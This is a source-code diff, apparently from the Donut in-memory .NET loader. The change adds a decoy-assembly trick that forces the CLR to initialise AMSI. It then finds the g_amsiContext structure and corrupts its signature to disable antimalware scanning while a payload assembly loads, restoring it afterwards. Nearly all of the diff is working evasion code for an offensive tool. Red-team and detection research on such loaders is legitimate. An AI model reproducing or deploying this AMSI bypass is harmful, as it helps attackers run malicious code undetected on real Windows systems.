@@ -89,6 +89,12 @@ DWORD ThreadProc(LPVOID lpParameter) {
       if(!DownloadModule(inst)) return -1;
     }
 
+    // allocate console for modules that require access
+    // to a console..
+    #if !defined(DEBUG)
+      //inst->api.AllocConsole();
+    #endif
+    
     if(LoadAssembly(inst, &assembly)) {
       RunAssembly(inst, &assembly);
     }
@@ -107,11 +113,13 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     BSTR            domain;
     SAFEARRAYBOUND  sab;
     SAFEARRAY       *sa;
-    DWORD           i;
+    DWORD           i, cbSize, dwRelease;
     BOOL            loaded=FALSE, loadable, amsi;
     PBYTE           p;
     HMODULE         hAMSI;
     PAMSICONTEXT    AmsiCtx = NULL;
+    LSTATUS         lStatus;
+    CHAR            szVersion[32];
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -146,7 +154,8 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
             hr = pa->icri->lpVtbl->GetInterface(
               pa->icri, 
               (REFCLSID)&inst->xCLSID_CorRuntimeHost, 
-              (REFIID)&inst->xIID_ICorRuntimeHost, (LPVOID)&pa->icrh);
+              (REFIID)&inst->xIID_ICorRuntimeHost, 
+              (LPVOID)&pa->icrh);
               
             DPRINT("HRESULT: %08lx", hr);
           }
@@ -191,38 +200,75 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
           pa->iu, (REFIID)&inst->xIID_AppDomain, (LPVOID)&pa->ad);
           
         if(SUCCEEDED(hr)) {
-          DPRINT("SafeArrayCreate(%lli bytes)", inst->mod_len);
+          // Get the Release value of v4 framework
+          lStatus = inst->api.SHGetValueA(
+            HKEY_LOCAL_MACHINE, 
+            inst->subkey, inst->value, 
+            0, &dwRelease, &cbSize);
+         
+          DPRINT("GetValue(Release) returned lStatus : %08lx", 
+            lStatus);
+          
+          // If GetValue was successful
+          // We're running >= v4.5
+          if(lStatus == ERROR_SUCCESS) {
+            DPRINT("Framework Release : %08lx", dwRelease);
+            // if release >= v4.8
+            if(dwRelease >= 528049) {
+              // Get module handle for AMSI.dll
+              hAMSI = inst->api.GetModuleHandle(inst->amsi);
+              if(hAMSI == NULL) {
+                // Try force CLR to load and initialize g_amsiContext
+                // by using a harmless .NET assembly
+                DPRINT("SafeArrayCreate(%lli bytes)", inst->decoy_len);
+                
+                sab.lLbound   = 0;
+                sab.cElements = inst->decoy_len;
+                sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
+                
+                if(sa != NULL) {
+                  DPRINT("Copying decoy assembly to safe array");
+                  
+                  for(i=0, p=sa->pvData; i<inst->decoy_len; i++) {
+                    p[i] = inst->decoy[i];
+                  }
+
+                  DPRINT("AppDomain::Load_3(decoy)");
+                  
+                  hr = pa->ad->lpVtbl->Load_3(
+                    pa->ad, sa, &pa->as);
+
+                  DPRINT("HRESULT : %08lx", hr);
+                  DPRINT("Erasing decoy assembly from memory");
+                  
+                  for(i=0, p=sa->pvData; i<inst->decoy_len; i++) {
+                    p[i] = inst->decoy[i] = 0;
+                  }
+                  DPRINT("SafeArrayDestroy");
+                  inst->api.SafeArrayDestroy(sa);
+                }
+              }
+            }
+          }
+         
+          // check if AMSI loaded
+          hAMSI = inst->api.GetModuleHandle(inst->amsi);
+          
+          if(hAMSI != NULL) {
+            // Try find g_amsiContext
+            DPRINT("Detected AMSI");
+            // Search the CLR data section
+            amsi = FindAMSIContext(inst, &AmsiCtx);
+            DPRINT("AMSI Context %s", amsi ? "FOUND" : "NOT FOUND");
+          }
             
           sab.lLbound   = 0;
           sab.cElements = mod->len;
           sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
           
           if(sa != NULL) {
-            DPRINT("AppDomain::Load_3");            
-            
-            // AMSI is available since v4.8
-            // we assume it's not loaded until after a dummy call to Load_3()
-            //DebugBreak();
-            
-            // the first call attempts to initialize AMSI
-            hr = pa->ad->lpVtbl->Load_3(
-              pa->ad, sa, &pa->as); 
-
-            DPRINT("HRESULT : %08lx", hr);
-
-            DPRINT("Checking for AMSI");
-            hAMSI = inst->api.GetModuleHandle(inst->amsi);
-            
-            if(hAMSI != NULL) {
-              // we found it initialized by previous call to Load_3()
-              DPRINT("Detected AMSI");
-              // try to find the AMSI context in CLR data section
-              amsi = FindAMSIContext(inst, &AmsiCtx);
-              DPRINT("Amsi Context %s", amsi ? "FOUND" : "NOT FOUND");
-            }
-            
-            // if amsi context was found.. 
-            // disable it by corrupting the signature
+            // If g_amsiContext was found 
+            // Disable AMSI by corrupting the signature value
             if(AmsiCtx != NULL) {
               AmsiCtx->Signature++;
             }
@@ -248,8 +294,8 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
               p[i] = mod->data[i] = 0;
             }
 
-            // if amsi context was found.. 
-            // re-enable by fixing the signature
+            // If g_amsiContext was found 
+            // Re-enable AMSI by fixing the signature value
             if(AmsiCtx != NULL) {
               AmsiCtx->Signature--;
             }
